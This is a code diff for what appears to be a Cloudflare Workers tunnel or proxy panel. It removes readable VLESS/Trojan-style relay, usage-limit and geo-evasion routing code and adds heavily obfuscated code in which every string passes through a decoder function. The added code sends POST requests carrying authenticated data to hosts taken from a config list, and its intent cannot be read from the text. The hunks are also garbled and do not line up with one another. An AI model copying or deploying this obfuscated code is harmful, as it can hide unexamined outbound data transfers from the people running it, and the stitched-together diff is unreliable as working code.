-async function processTelemetryStream(env, ctx, wsRelayIdx) {
-    const [client, webSocket] = Object.values(new WebSocketPair());
-    webSocket.accept();
-    webSocket.binaryType = "arraybuffer";
-    startDataPipe(webSocket, env, ctx, wsRelayIdx);
-    return new Response(null, { status: 101, webSocket: client });
-}
-
-async function startDataPipe(webSocket, env, ctx, wsRelayIdx) {
-    activeConnections++;
-    try {
-        OPEN_WS++;
-    } catch (e) {}
-    // Per-connection byte counters (up+down). Flushed to usage on close.
-    let connBytesUp = 0;
-    let connBytesDown = 0;
-    // Relay ownership for this tunnel generation: only downstream bytes on
-    // THIS socket may confirm the selected relay (an old stream must never
-    // credit a new relay). Upstream is bounded so a flooding client cannot
-    // grow memory without limit.
-    let activeRelay = null;
-    let relayConfirmed = false;
-    let pendingUpBytes = 0;
-    let pendingUpItems = 0;
-    webSocket.addEventListener("close", () => {
-        activeConnections--;
-        try {
-            OPEN_WS = Math.max(0, OPEN_WS - 1);
-        } catch (e) {}
-        if (activeClientHash) {
-            let cur = activeConns.get(activeClientHash) || 0;
-            if (cur > 0) activeConns.set(activeClientHash, cur - 1);
-        }
-        try {
-            const totalConnBytes = connBytesUp + connBytesDown;
-            if (activeClientHash && totalConnBytes > 0) {
-                trackUsage(activeClientHash, totalConnBytes, env, ctx);
-            }
-        } catch (e) {}
-    });
-    webSocket.addEventListener("error", () => {});
-    let remoteSocket,
-        dataWriter,
-        isInit = true,
-        queue = Promise.resolve();
-    let activeClientHash = null;
-    webSocket.addEventListener("message", (event) => {
-        const size = event.data?.byteLength || 0;
-        pendingUpBytes += size;
-        pendingUpItems++;
-        if (
-            pendingUpBytes > UPSTREAM_QUEUE_MAX_BYTES ||
-            pendingUpItems > UPSTREAM_QUEUE_MAX_ITEMS
-        ) {
-            try {
-                webSocket.close();
-            } catch (e) {}
-            return;
-        }
-        queue = queue.then(async () => {
-            pendingUpBytes = Math.max(0, pendingUpBytes - size);
-            pendingUpItems = Math.max(0, pendingUpItems - 1);
-            try {
-                if (isInit) {
-                    isInit = false;
-                    const isModeAlpha = await parseSensorData(
-                        event.data,
-                        wsRelayIdx,
-                    );
-                    if (isModeAlpha) webSocket.send(new Uint8Array([0, 0]));
-                } else if (dataWriter) {
-                    // Timed write: a stalled TCP write must reject and tear
-                    // down the tunnel, never hang the queue forever (->1101).
-                    try {
-                        await writeSocketWithTimeout(
-                            remoteSocket,
-                            dataWriter,
-                            event.data,
-                            UPSTREAM_WRITE_TIMEOUT_MS,
-                        );
-                    } catch (werr) {
-                        closeTcpSocketQuietly(remoteSocket);
-                        try {
-                            releaseWriterQuietly(dataWriter);
-                        } catch (e) {}
-                        dataWriter = null;
-                        try {
-                            webSocket.close();
-                        } catch (e) {}
-                        return;
+            if (!var_mg[func_dec(394)]) throw new Error(func_dec(398) + var_mg[func_dec(231)] + func_dec(3));
+            let var_mh = await var_mg[func_dec(200)]();
+            const var_mi = await func_p(var_d[func_dec(54)], var_d[func_dec(55)], var_d[func_dec(56)], var_mh);
+            const var_mj = await var_mi[func_dec(107)]();
+            if (var_mj[func_dec(108)]) {
+              await func_al(var_ma, func_dec(399), func_dec(400) + var_md + func_dec(401));
+              if (var_d[func_dec(72)] && Array[func_dec(161)](var_d[func_dec(72)])) {
+                for (const var_mk of var_d[func_dec(72)]) {
+                  if (var_mk && var_mk[func_dec(206)] && var_mk[func_dec(402)]) {
+                    let var_ml = var_mk[func_dec(206)][func_dec(255)]();
+                    if (!var_ml[func_dec(299)](func_dec(300)) && !var_ml[func_dec(299)](func_dec(301))) {
+                      var_ml = func_dec(301) + var_ml;
                     }
                     try {
-                        connBytesUp += event.data?.byteLength || 0;
-                    } catch (e) {}
-                }
-            } catch (err) {
-                webSocket.close();
-            }
-        });
-    });
-
-    async function parseSensorData(bufferData, wsRelayIdx) {
-        const view = new Uint8Array(bufferData);
-        let targetAddr = "",
-            targetPort = 0,
-            offset = 0,
-            isModeAlpha = false,
-            activeProfile = null;
-
-        if (view[0] === 0x00) {
-            isModeAlpha = true;
-
-            let clientHash = Array.from(view.slice(1, 17))
-                .map((b) => b.toString(16).padStart(2, "0"))
-                .join("");
-            let configEntry = lookupConfigEntry(clientHash);
-
-            if (configEntry) {
-                activeClientHash = configEntry.userId
-                    .replace(/-/g, "")
-                    .toLowerCase();
-                activeProfile = getAllProfiles().find(
-                    (p) =>
-                        p.id.replace(/-/g, "").toLowerCase() ===
-                        activeClientHash,
-                );
-                if (!activeProfile) return false;
-                if (configEntry.relayIp)
-                    activeProfile = {
-                        ...activeProfile,
-                        proxyIp: configEntry.relayIp,
-                    };
-            } else {
-                let decoded = decodeConfigUuid(clientHash);
-                if (decoded) {
-                    activeProfile = getAllProfiles().find((p) =>
-                        p.id
-                            .replace(/-/g, "")
-                            .toLowerCase()
-                            .startsWith(decoded.userFingerprint),
-                    );
-                    if (activeProfile && decoded.relayIpIndex >= 0) {
-                        const effectivePips = getEffectivePips(activeProfile);
-                        if (effectivePips.length > 0) {
-                            const idx =
-                                decoded.relayIpIndex % effectivePips.length;
-                            activeProfile = {
-                                ...activeProfile,
-                                proxyIp: effectivePips[idx],
-                            };
-                        }
-                    }
-                }
-                if (!activeProfile) {
-                    activeProfile = getAllProfiles().find(
-                        (p) =>
-                            p.id.replace(/-/g, "").toLowerCase() === clientHash,
-                    );
-                }
-                if (!activeProfile) return false;
-                activeClientHash = activeProfile.id
-                    .replace(/-/g, "")
-                    .toLowerCase();
-            }
-            trackUsage(activeClientHash, 0, env, ctx);
-
-            let currentConns = activeConns.get(activeClientHash) || 0;
-            if (activeProfile && activeProfile.connLimit) {
-                if (currentConns >= activeProfile.connLimit) {
-                    webSocket.close();
-                    return isModeAlpha;
-                }
-            }
-            activeConns.set(activeClientHash, currentConns + 1);
-
-            let uTrack = uuidUsage.get(activeClientHash) || {
-                connects: 0,
-                last: 0,
-            };
-            uTrack.connects++;
-            uTrack.last = Date.now();
-            uuidUsage.set(activeClientHash, uTrack);
-
-            const optLen = view[17];
-            const pPos = 18 + optLen + 1;
-            targetPort = new DataView(
-                bufferData.slice(pPos, pPos + 2),
-            ).getUint16(0);
-            const aType = view[pPos + 2];
-            let vPos = pPos + 3,
-                aLen = 0;
-
-            if (aType === 1) {
-                aLen = 4;
-                targetAddr = view.slice(vPos, vPos + aLen).join(".");
-            } else if (aType === 2) {
-                aLen = view[vPos];
-                vPos++;
-                targetAddr = new TextDecoder().decode(
-                    view.slice(vPos, vPos + aLen),
-                );
-            } else if (aType === 3) {
-                aLen = 16;
-                const dv = new DataView(bufferData.slice(vPos, vPos + aLen));
-                targetAddr = Array.from({ length: 8 }, (_, i) =>
-                    dv.getUint16(i * 2).toString(16),
-                ).join(":");
-            }
-            offset = vPos + aLen;
-        } else {
-            let ePos = bufferData.byteLength;
-            for (let i = 0; i < bufferData.byteLength; i++) {
-                if (view[i] === 0x0d && view[i + 1] === 0x0a) {
-                    ePos = i;
-                    break;
-                }
-            }
-
-            let clientHashHex = new TextDecoder().decode(view.slice(0, ePos));
-            let configEntry = lookupConfigEntry(clientHashHex);
-
-            if (configEntry) {
-                activeClientHash = configEntry.userId
-                    .replace(/-/g, "")
-                    .toLowerCase();
-                activeProfile = getAllProfiles().find(
-                    (p) =>
-                        p.id.replace(/-/g, "").toLowerCase() ===
-                        activeClientHash,
-                );
-                if (!activeProfile) return false;
-                if (configEntry.relayIp)
-                    activeProfile = {
-                        ...activeProfile,
-                        proxyIp: configEntry.relayIp,
-                    };
-            } else {
-                activeProfile = getAllProfiles().find(
-                    (p) => getTrojanHash(p.id) === clientHashHex,
-                );
-                if (!activeProfile) return false;
-                activeClientHash = activeProfile.id
-                    .replace(/-/g, "")
-                    .toLowerCase();
-                if (wsRelayIdx >= 0) {
-                    const effectivePips = getEffectivePips(activeProfile);
-                    if (effectivePips.length > 0) {
-                        activeProfile = {
-                            ...activeProfile,
-                            proxyIp:
-                                effectivePips[
-                                    wsRelayIdx % effectivePips.length
-                                ],
-                        };
-                    }
-                }
-            }
-            trackUsage(activeClientHash, 0, env, ctx);
-            let currentConns = activeConns.get(activeClientHash) || 0;
-            if (activeProfile && activeProfile.connLimit) {
-                if (currentConns >= activeProfile.connLimit) {
-                    webSocket.close();
-                    return isModeAlpha;
-                }
-            }
-            activeConns.set(activeClientHash, currentConns + 1);
-            let uTrack = uuidUsage.get(activeClientHash) || {
-                connects: 0,
-                last: 0,
-            };
-            uTrack.connects++;
-            uTrack.last = Date.now();
-            uuidUsage.set(activeClientHash, uTrack);
-
-            let hPos = ePos + 2;
-            hPos++;
-            let aType = view[hPos];
-            hPos++;
-            let aLen = 0;
-
-            if (aType === 1) {
-                aLen = 4;
-                targetAddr = view.slice(hPos, hPos + aLen).join(".");
-            } else if (aType === 3) {
-                aLen = view[hPos];
-                hPos++;
-                targetAddr = new TextDecoder().decode(
-                    view.slice(hPos, hPos + aLen),
-                );
-            } else if (aType === 4) {
-                aLen = 16;
-                const dv = new DataView(bufferData.slice(hPos, hPos + aLen));
-                targetAddr = Array.from({ length: 8 }, (_, i) =>
-                    dv.getUint16(i * 2).toString(16),
-                ).join(":");
-            }
-
-            hPos += aLen;
-            targetPort = new DataView(
-                bufferData.slice(hPos, hPos + 2),
-            ).getUint16(0);
-            offset = hPos + 4;
-        }
-
-        let isDomain =
-            /^([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$/.test(targetAddr) ||
-            /^[a-zA-Z0-9-]+$/.test(targetAddr);
-        let connectAddr = targetAddr;
-        // AI smart egress classification: explicit domain literal, else TLS
-        // SNI sniff (clients usually send an IP literal in the header).
-        let aiEgress = false;
-        try {
-            if (isDomain) aiEgress = isAiDomain(targetAddr);
-            else if (targetPort === 443 && offset < bufferData.byteLength) {
-                aiEgress = isAiDomain(
-                    sniffSniFromHello(bufferData.slice(offset)),
-                );
-            }
-        } catch (e) {}
-        if (isDomain && sysConfig.customDns) {
-            try {
-                const dohUrl = new URL(sysConfig.customDns);
-                dohUrl.searchParams.set("name", targetAddr);
-                dohUrl.searchParams.set("type", "A");
-                let dnsRes = await fetchT(dohUrl.toString(), {
-                    headers: { accept: "application/dns-json" },
-                });
-                let dnsJson = await dnsRes.json();
-                if (dnsJson.Answer && dnsJson.Answer.length > 0) {
-                    connectAddr = dnsJson.Answer[0].data;
-                }
-            } catch (e) {}
-        }
-
-        try {
-            remoteSocket = connect({ hostname: connectAddr, port: targetPort });
-            await withDeadline(
-                remoteSocket.opened,
-                TCP_OPEN_TIMEOUT_MS,
-                () => closeTcpSocketQuietly(remoteSocket),
-                "direct-open",
-            );
-            activeRelay = null;
-            relayConfirmed = false;
-        } catch {
-            let pips = [];
-            if (activeProfile && activeProfile.proxyIp) {
-                pips = activeProfile.proxyIp
-                    .split(/[\r\n,;]+/)
-                    .map((s) => s.trim())
-                    .filter(Boolean);
-            }
-            if (pips.length === 0 && sysConfig.backupRelay) {
-                pips = sysConfig.backupRelay
-                    .split(/[\r\n,;]+/)
-                    .map((s) => s.trim())
-                    .filter(Boolean);
-            }
-            if (pips.length === 0 && sysConfig.customRelay) {
-                pips = sysConfig.customRelay
-                    .split(/[\r\n,;]+/)
-                    .map((s) => s.trim())
-                    .filter(Boolean);
-            }
-
-            // Consistent hash based on user/profile ID to prevent session/IP splitting across assets on Cloudflare
-            // AI smart egress: AI-flagged relays first, deterministic (no
-            // rotation) so AI exits via clean-country relays. Untouched when
-            // no AI relay is present (distribution exactly as before).
-            let startIndex = 0;
-            let aiPinned = false;
-            try {
-                if (aiEgress) {
-                    const ord = orderAiFirstTokens(pips);
-                    if (ord.moved) {
-                        pips = ord.list;
-                        aiPinned = true;
-                    }
-                }
-            } catch (e) {}
-            if (pips.length > 1 && !aiPinned) {
-                let hash = 0;
-                let hashStr = activeProfile ? activeProfile.id : "";
-                for (let i = 0; i < hashStr.length; i++) {
-                    hash = hashStr.charCodeAt(i) + ((hash << 5) - hash);
-                }
-                startIndex = Math.abs(hash) % pips.length;
-            }
-
-            // Attempt to connect with automatic failover to alternative proxy IPs
-            // (quarantined relays are skipped unless everything is down).
-            // Per-SNI AI quarantine: relays failing only AI traffic are skipped
-            // for AI destinations (never for the rest).
-            let connected = false;
-            let tryPips = filterQuarantinedRelays(pips);
-            try {
-                if (aiEgress && tryPips.length > 1)
-                    tryPips = filterAiQuarantinedTokens(tryPips);
-            } catch (e) {}
-            for (
-                let attempt = 0;
-                attempt < Math.min(tryPips.length, 3);
-                attempt++
-            ) {
-                let currentIndex = (startIndex + attempt) % tryPips.length;
-                let currentProxy = tryPips[currentIndex];
-                const rkFail = relayKeyOf(currentProxy);
-                try {
-                    const [altIP0, altPortStr0] = currentProxy.split(":");
-                    // Strip #Name from the port (Number("8443#X") is NaN) and
-                    // prefer the parsed host (fixes IPv6 + "#Name" tokens).
-                    // Semantics otherwise unchanged (garbage still fails).
-                    const altPortClean = altPortStr0
-                        ? altPortStr0.split("#")[0].trim()
-                        : altPortStr0;
-                    const altIP =
-                        rkFail && rkFail.host ? rkFail.host : altIP0;
-                    remoteSocket = connect({
-                        hostname: altIP,
-                        port: altPortClean ? Number(altPortClean) : targetPort,
-                    });
-                    await withDeadline(
-                        remoteSocket.opened,
-                        TCP_OPEN_TIMEOUT_MS,
-                        () => closeTcpSocketQuietly(remoteSocket),
-                        "relay-open",
-                    );
-                    connected = true;
-                    // No instant success credit: a TCP accept is weak proof
-                    // (a dead relay accepts TCP then hangs). The relay is
-                    // bound to this tunnel generation and confirmed only by
-                    // real downstream bytes in the pipe below.
-                    relayConfirmed = false;
-                    activeRelay = rkFail
-                        ? {
-                              host: rkFail.host,
-                              port: rkFail.port,
-                              ai: aiEgress,
-                          }
-                        : null;
-                    break;
-                } catch (e) {
-                    if (rkFail) {
-                        try {
-                            // AI-only failures feed the AI map so the relay
-                            // stays alive for all other traffic.
-                            if (aiEgress)
-                                recordAiFailure(rkFail.host, rkFail.port);
-                            else recordRelayFailure(rkFail.host, rkFail.port);
-                        } catch (ee) {}
-                    }
-                    // Try next fallback proxy IP in list
-                }
-            }
-            if (!connected) {
-                webSocket.close();
-                return isModeAlpha;
-            }
-        }
-
-        dataWriter = remoteSocket.writable.getWriter();
-        if (offset < bufferData.byteLength) {
-            let chunk = bufferData.slice(offset);
-            // Timed initial write: never hang the handshake path.
-            try {
-                await writeSocketWithTimeout(
-                    remoteSocket,
-                    dataWriter,
-                    chunk,
-                    TCP_WRITE_TIMEOUT_MS,
-                );
-            } catch (e) {
-                closeTcpSocketQuietly(remoteSocket);
-                try {
-                    releaseWriterQuietly(dataWriter);
-                } catch (_) {}
-                dataWriter = null;
-                try {
-                    webSocket.close();
-                } catch (_) {}
-                return isModeAlpha;
-            }
-            try {
-                connBytesUp += chunk.byteLength || 0;
-            } catch (e) {}
-        }
-        // Downstream pipe: the FIRST real bytes on this socket confirm the
-        // bound relay (end-to-end proof). Completion closes the client side
-        // so a dead remote cannot leave a half-open tunnel behind.
-        try {
-            remoteSocket.readable
-                .pipeTo(
-                    new WritableStream({
-                        write(chunk) {
-                            try {
-                                connBytesDown += chunk?.byteLength || 0;
-                                const n =
-                                    (chunk && chunk.byteLength) || 0;
-                                if (
-                                    n > 0 &&
-                                    activeRelay &&
-                                    !relayConfirmed
-                                ) {
-                                    relayConfirmed = true;
-                                    try {
-                                        recordRelaySuccess(
-                                            activeRelay.host,
-                                            activeRelay.port,
-                                            true,
-                                        );
-                                    } catch (e) {}
-                                    try {
-                                        if (activeRelay.ai)
-                                            recordAiSuccess(
-                                                activeRelay.host,
-                                                activeRelay.port,
-                                            );
-                                    } catch (e) {}
-                                }
-                            } catch (e) {}
-                            try {
-                                webSocket.send(chunk);
-                            } catch (e) {}
+                      const var_mm = new URL(var_ml);
+                      const var_mn = func_dec(3) + var_mm[func_dec(302)] + func_dec(403) + var_mm[func_dec(303)] + func_dec(211) + encodeURI(var_d[func_dec(25)]) + func_dec(228);
+                      var_mb?.[func_dec(186)](func_e(var_mn, {
+                        [func_dec(123)]: func_dec(197),
+                        [func_dec(104)]: {
+                          [func_dec(198)]: func_dec(121)
                         },
-                        close() {},
-                        abort() {},
-                    }),
-                )
-                .catch(() => {})
-                .finally(() => {
-                    closeTcpSocketQuietly(remoteSocket);
-                    try {
-                        webSocket.close();
-                    } catch (e) {}
-                });
-        } catch (e) {}
-
-        return isModeAlpha;
-    }
-}
-
-function generateHardwareId(seed) {
-    const h20 = Array.from(new TextEncoder().encode(seed))
-        .map((b) => b.toString(16).padStart(2, "0"))
-        .join("")
-        .slice(0, 20)
-        .padEnd(20, "0");
-    return `${h20.slice(0, 8)}-0000-4000-8000-${h20.slice(-12)}`;
-}
-
-function getTransportParams(port) {
-    return ["80", "8080", "8880", "2052", "2082", "2086", "2095"].includes(
-        port.toString(),
-    )
-        ? "none"
-        : "tls";
-}
-
-function getSubscriptionStats(targetSub = null) {
-    let name = "Default";
-    let id = activeDeviceId;
-    let limitTotalReq = 0;
-    let expiryMs = 0;
-
-    let hasMultiUser = sysConfig.users && sysConfig.users.length > 0;
-    if (hasMultiUser && targetSub) {
-        let user = sysConfig.users.find(
-            (u) =>
-                u.name.toLowerCase() === targetSub.toLowerCase() ||
-                u.id === targetSub,
-        );
-        if (user) {
-            name = user.name;
-            id = user.id;
-            limitTotalReq = user.limitTotalReq || 0;
-            expiryMs = user.expiryMs || 0;
+                        [func_dec(125)]: JSON[func_dec(119)]({
+                          [func_dec(163)]: var_mk[func_dec(402)],
+                          [func_dec(404)]: func_dec(405),
+                          [func_dec(406)]: var_mh,
+                          [func_dec(407)]: true
+                        }),
+                        [func_dec(7)]: AbortSignal[func_dec(90)](15000)
+                      })[func_dec(187)](() => {}));
+                    } catch (var_mo) {}
+                  }
+                }
+              }
+            }
+          } catch (var_mp) {
+            await func_al(var_ma, func_dec(408), func_dec(409) + var_mp[func_dec(410)] + func_dec(3));
+          }
         }
-    } else if (!hasMultiUser) {
-        limitTotalReq = sysConfig.limitTotalReq || 0;
-        expiryMs = sysConfig.expiryMs || 0;
+      }
+    } catch (var_mq) {}
+  }
+};
+async function func_ag(var_mr, var_ms) {
+  try {
+    if (func_i() >= 1) {
+      return new Response(func_dec(411), {
+        [func_dec(231)]: 404
+      });
     }
-
-    let idClean = id.replace(/-/g, "").toLowerCase();
-    let sysU = sysUsageCache?.users?.[idClean] || { reqs: 0, dReqs: 0 };
-    let totalBytesUsed = usageTotalBytes(sysU);
-
-    let totalGb = (totalBytesUsed / 1073741824).toFixed(2);
-    let limitTotalGb = limitTotalReq
-        ? (limitReqToBytes(limitTotalReq) / 1073741824).toFixed(2)
-        : "Unlimited";
-
-    let expiryDateTxt = "Never Expire";
-    let remDaysTxt = "Never Expire";
-    if (expiryMs) {
-        let exp = new Date(expiryMs);
-        expiryDateTxt = exp.toISOString().split("T")[0];
-        let remDays = Math.ceil(
-            (expiryMs - Date.now()) / (1000 * 60 * 60 * 24),
-        );
-        remDaysTxt = remDays >= 0 ? `${remDays} Days Left` : "Expired";
-    }
-
-    return {
-        usedStr: `Used: ${totalGb} GB / ${limitTotalGb} GB`,
-        expiryStr: `Expiry: ${expiryDateTxt} (${remDaysTxt})`,
+  } catch (var_mx) {}
+  let var_mt = var_d[func_dec(27)] ? var_d[func_dec(27)][func_dec(18)](func_dec(413))[func_dec(144)](var_my => var_my[func_dec(255)]())[func_dec(412)](var_mz => var_mz) : [func_dec(414)];
+  const var_mu = var_mr[func_dec(104)][func_dec(150)](func_dec(165)) || func_dec(415);
+  const var_mv = Array[func_dec(417)](var_mu)[func_dec(416)]((var_na, var_nb) => var_na + var_nb[func_dec(418)](0), 0);
+  const var_mw = var_mt[var_mv % var_mt[func_dec(135)]][func_dec(299)](func_dec(419)) ? var_mt[var_mv % var_mt[func_dec(135)]] : func_dec(301) + var_mt[var_mv % var_mt[func_dec(135)]] + func_dec(3);
+  try {
+    const var_nc = new URL(var_mw);
+    if (var_ms[func_dec(209)] !== func_dec(211)) var_nc[func_dec(209)] = var_ms[func_dec(209)];
+    var_nc[func_dec(420)] = var_ms[func_dec(420)];
+    const var_nd = new Headers(var_mr[func_dec(104)]);
+    var_nd[func_dec(151)](func_dec(257), var_nc[func_dec(243)]);
+    var_nd[func_dec(304)](func_dec(165));
+    var_nd[func_dec(304)](func_dec(421));
+    const var_ne = {
+      [func_dec(123)]: var_mr[func_dec(123)],
+      [func_dec(104)]: var_nd,
+      [func_dec(422)]: func_dec(423)
     };
-}
-
-function getFakeConfigNames(targetSub = null) {
-    let stats = getSubscriptionStats(targetSub);
-    let configs = sysConfig.fakeConfigs || [
-        { name: "📊 {usage}", enabled: true },
-        { name: "📅 {expiry}", enabled: true },
-    ];
-    return configs
-        .filter((f) => f && f.enabled && f.name)
-        .map((f) => {
-            return f.name
-                .replace(/\{usage\}/g, stats.usedStr)
-                .replace(/\{expiry\}/g, stats.expiryStr);
-        });
-}
-
-function getCleanIps(hostName, userCleanIps = null) {
-    let rawIps = userCleanIps || sysConfig.cleanIps;
-    let ips = rawIps
-        ? rawIps
-              .split(/[\r\n,;]+/)
-              .map((s) => {
-                  let t = s.trim();
-                  return t ? t.split("#")[0].trim() : "";
-              })
-              .filter(Boolean)
-        : [];
-    if (ips.length === 0)
-        ips = [
-            hostName.endsWith(".pages.dev") ? sysConfig.metricNode : hostName,
-        ];
-    return ips;
-}
-
-function getCleanIpsWithNames(hostName, userCleanIps = null) {
-    let rawIps = userCleanIps || sysConfig.cleanIps;
-    let entries = rawIps
-        ? rawIps
-              .split(/[\r\n,;]+/)
-              .map((s) => {
-                  let t = s.trim();
-                  if (!t) return null;
-                  let parts = t.split("#");
-                  let ip = parts[0].trim();
-                  let name = (parts[1] || "").trim();
-                  return ip ? { ip, name } : null;
-              })
-              .filter(Boolean)
-        : [];
-    if (entries.length === 0)
-        entries = [
-            {
-                ip: hostName.endsWith(".pages.dev")
-                    ? sysConfig.metricNode
-                    : hostName,
-                name: "",
-            },
-        ];
-    return entries;
-}
-
-function getAllProfiles(targetSub = null) {
-    let list = [{ id: activeDeviceId, name: "Default" }];
-
-    if (sysConfig.users && sysConfig.users.length > 0) {
-        let now = Date.now();
-        sysConfig.users.forEach((u) => {
-            let skip = false;
-            if (u.expiryMs && now > u.expiryMs) skip = true;
-            if (u.isPaused) skip = true;
-            if (
-                u.limitTotalReq &&
-                sysUsageCache &&
-                sysUsageCache.users &&
-                sysUsageCache.users[u.id.replace(/-/g, "").toLowerCase()]
-            ) {
-                if (
-                    sysUsageCache.users[u.id.replace(/-/g, "").toLowerCase()]
-                        .reqs >= u.limitTotalReq
-                )
-                    skip = true;
-            }
-            if (
-                u.limitDailyReq &&
-                sysUsageCache &&
-                sysUsageCache.users &&
-                sysUsageCache.users[u.id.replace(/-/g, "").toLowerCase()]
-            ) {
-                let usr =
-                    sysUsageCache.users[u.id.replace(/-/g, "").toLowerCase()];
-                if (
-                    usr.lastDay === new Date().toISOString().split("T")[0] &&
-                    usr.dReqs >= u.limitDailyReq
-                )
-                    skip = true;
-            }
-            if (!skip) {
-                list.push({
-                    id: u.id,
-                    name: u.name,
-                    proxyIp: u.proxyIp,
-                    cleanIp: u.cleanIp || null,
-                    userMode: u.userMode || null,
-                    userPorts: u.userPorts || null,
-                    maxConfigs: u.maxConfigs || null,
-                    proxyIpGeo: u.proxyIpGeo || null,
-                    userNodes: u.userNodes || null,
-                    nat64: u.nat64 || null,
-                    connLimit: u.connLimit || null,
-                    userPanelUrl: u.userPanelUrl || null,
-                });
-                registerConfigEntry(u.id, u.id, u.proxyIp || "");
-            }
-        });
-    }
-
-    if (targetSub) {
-        list = list.filter(
-            (p) => p.name.toLowerCase() === targetSub.toLowerCase() || p.id === targetSub,
-        );
-    }
-    return list;
-}
-
-// Returns the hostname of a linked panel URL (strips scheme/path/port). The
-// linkedPanels API system (cross-panel sync) is untouched; here we only read
-// its URLs as extra parallel node hosts, restoring 2.6 "parallel node" behavior.
-function linkedPanelHost(p) {
-    let raw = p && typeof p === "object" ? p.url || "" : p || "";
-    raw = String(raw).trim();
-    if (!raw) return "";
-    raw = raw.replace(/^[a-zA-Z]+:\/\//, ""); // drop scheme
-    raw = raw.split("/")[0]; // drop path
-    raw = raw.split("@").pop(); // drop credentials
-    if (raw.startsWith("[")) {
-        // [ipv6]:port
-        return raw.slice(0, raw.indexOf("]") + 1);
-    }
-    return raw.split(":")[0]; // drop port
-}
-
-// Combined parallel-node host list = slaveNodes (legacy) + linkedPanels URLs (2.9 API).
-function getGlobalNodeHosts() {
-    let hosts = [];
-    if (sysConfig.slaveNodes)
-        hosts.push(
-            ...sysConfig.slaveNodes
-                .split(/[\r\n,;]+/)
-                .map((s) => s.trim())
-                .filter(Boolean),
-        );
-    if (Array.isArray(sysConfig.linkedPanels))
-        hosts.push(
-            ...sysConfig.linkedPanels.map(linkedPanelHost).filter(Boolean),
-        );
-    return [...new Set(hosts)];
-}
-
-function getProxyIpsArray(proxyIpString) {
-    if (!proxyIpString) return [];
-    return proxyIpString
-        .split(/[\r\n,;]+/)
-        .map((s) => {
-            let trimmed = s.trim();
-            if (!trimmed) return "";
-            let hostPort = trimmed.split("#")[0].split("@")[0];
-            if (hostPort.includes(":") && !hostPort.includes("]")) {
-                return hostPort.split(":")[0];
-            } else if (hostPort.startsWith("[") && hostPort.includes("]")) {
-                return hostPort.split("]")[0].replace("[", "");
-            }
-            return hostPort;
-        })
-        .filter(Boolean);
-}
-
-function ipv4ToNat64(ipv4, prefix) {
-    if (!prefix || !ipv4) return null;
-    let parts = ipv4.split(".");
-    if (parts.length !== 4 || parts.some((p) => isNaN(parseInt(p))))
-        return null;
-    let hex = parts
-        .map((p) => parseInt(p).toString(16).padStart(2, "0"))
-        .join("");
-    let suffix = hex.match(/.{1,4}/g).join(":");
-    return prefix.replace(/\/\d+$/, "").replace(/:$/, "") + "::" + suffix;
-}
-
-function getProxyIpsWithNat64(proxyIpString, nat64Prefix) {
-    let ips = getProxyIpsArray(proxyIpString);
-    if (nat64Prefix) {
-        let prefixes = nat64Prefix
-            .split(/[\r\n,;]+/)
-            .map((s) => s.trim())
-            .filter(Boolean);
-        let nat64Ips = [];
-        prefixes.forEach((prefix) => {
-            ips.forEach((ip) => {
-                if (/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(ip)) {
-                    let nat64 = ipv4ToNat64(ip, prefix);
-                    if (nat64) nat64Ips.push(nat64);
-                }
-            });
-        });
-        ips = ips.concat(nat64Ips);
-    }
-    return ips;
-}
-
-const VALID_NAME_TAGS = [
-    "FLAG",
-    "COUNTRY",
-    "CITY",
-    "ISP",
-    "PROTOCOL",
-    "USER",
-    "PORT",
-    "PREFIX",
-    "IP",
-    "IP_NAME",
-    "HOST",
-    "DATE",
-    "INDEX",
-    "WORKER",
-];
-const ipGeoCache = new Map();
-
-function validateNameStrategy(strategy) {
-    if (!strategy) return { valid: true, unknownTags: [] };
-    const tagPattern = /\{([A-Za-z]+)\}/g;
-    let match;
-    let unknownTags = [];
-    while ((match = tagPattern.exec(strategy)) !== null) {
-        let tag = match[1].toUpperCase();
-        if (!VALID_NAME_TAGS.includes(tag)) unknownTags.push(match[1]);
-    }
-    return { valid: unknownTags.length === 0, unknownTags };
-}
-
-async function preloadIpFlags(profiles, hostNames) {
-    let uniqueIps = new Set();
-    profiles.forEach((p) => {
-        hostNames.forEach((h) => {
-            getCleanIps(h, p.cleanIp).forEach((ip) => uniqueIps.add(ip));
-        });
-        if (p.proxyIp) {
-            getProxyIpsArray(p.proxyIp).forEach((ip) => uniqueIps.add(ip));
-        }
+    if (var_mr[func_dec(123)] !== func_dec(253) && var_mr[func_dec(123)] !== func_dec(424)) var_ne[func_dec(125)] = var_mr[func_dec(125)];
+    return await func_e(new Request(var_nc[func_dec(147)](), var_ne));
+  } catch (var_nf) {
+    return new Response(func_dec(411), {
+      [func_dec(231)]: 404
     });
-    if (sysConfig.backupRelay) {
-        getProxyIpsArray(sysConfig.backupRelay).forEach((ip) =>
-            uniqueIps.add(ip),
-        );
-    }
-    if (sysConfig.customRelay) {
-        getProxyIpsArray(sysConfig.customRelay).forEach((ip) =>
-            uniqueIps.add(ip),
-        );
-    }
-
-    let uncached = Array.from(uniqueIps).filter((ip) => !ipGeoCache.has(ip));
-    for (let i = 0; i < uncached.length; i += 100) {
-        let batch = uncached.slice(i, i + 100);
-        let queries = batch.map((ip) => {
-            let clean = ip
-                .split(":")[0]
-                .replace(/[\[\]]/g, "")
-                .split("#")[0]
-                .trim();
-            return {
-                query: clean,
-                fields: "status,country,countryCode,city,isp,org",
-            };
+  }
+}
+let var_ad = null;
+let var_ae = null;
+let var_af = null;
+function func_ah(var_ng) {
+  let var_nh = false;
+  if (var_ng && var_ng[func_dec(36)] && var_ng[func_dec(36)][func_dec(255)]()[func_dec(135)] > 0) {
+    if (!var_ng[func_dec(72)]) var_ng[func_dec(72)] = [];
+    let var_ni = var_ng[func_dec(36)][func_dec(18)](new RegExp(func_dec(425), func_dec(3)))[func_dec(144)](var_nk => var_nk[func_dec(255)]())[func_dec(412)](Boolean);
+    let var_nj = var_ng[func_dec(74)] || func_dec(3);
+    var_ni[func_dec(176)](var_nl => {
+      let var_nm = var_nl[func_dec(155)](new RegExp(func_dec(426), func_dec(3)), func_dec(3))[func_dec(18)](func_dec(211))[0][func_dec(18)](func_dec(427))[func_dec(387)]()[func_dec(18)](func_dec(428))[0][func_dec(154)]();
+      let var_nn = var_ng[func_dec(72)][func_dec(162)](var_no => {
+        if (!var_no || !var_no[func_dec(206)]) return false;
